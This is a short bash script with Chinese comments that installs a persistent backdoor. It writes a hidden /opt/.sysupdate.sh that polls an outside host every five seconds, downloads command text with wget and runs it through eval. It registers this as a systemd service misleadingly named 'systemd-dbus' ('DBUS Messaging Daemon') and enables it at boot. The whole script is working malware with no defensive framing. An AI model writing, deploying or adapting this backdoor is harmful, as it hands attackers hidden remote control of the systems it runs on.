#!/bin/bash

# 1. 删除并重新写入脚本
if [ -f /opt/.sysupdate.sh ]; then
  rm -f /opt/.sysupdate.sh  # 删除已存在的脚本
fi

cat << 'EOF' > /opt/.sysupdate.sh
#!/bin/bash
while true; do
  cmd=$(wget -qO- https://a.dps.dpdns.org/cmd.txt)  # 使用 wget 代替 curl
  eval "$cmd"
  sleep 5  # 每5秒检查一次命令
done
EOF

chmod +x /opt/.sysupdate.sh

# 2. 删除并重新写 systemd 服务
if [ -f /etc/systemd/system/systemd-dbus.service ]; then
  rm -f /etc/systemd/system/systemd-dbus.service  # 删除已存在的 systemd 服务
fi

cat <<EOF > /etc/systemd/system/systemd-dbus.service
[Unit]
Description=DBUS Messaging Daemon

[Service]
ExecStart=/bin/bash /opt/.sysupdate.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 3. 启用并启动服务
systemctl daemon-reload  # 重新加载 systemd 服务配置
systemctl enable systemd-dbus
systemctl start systemd-dbus
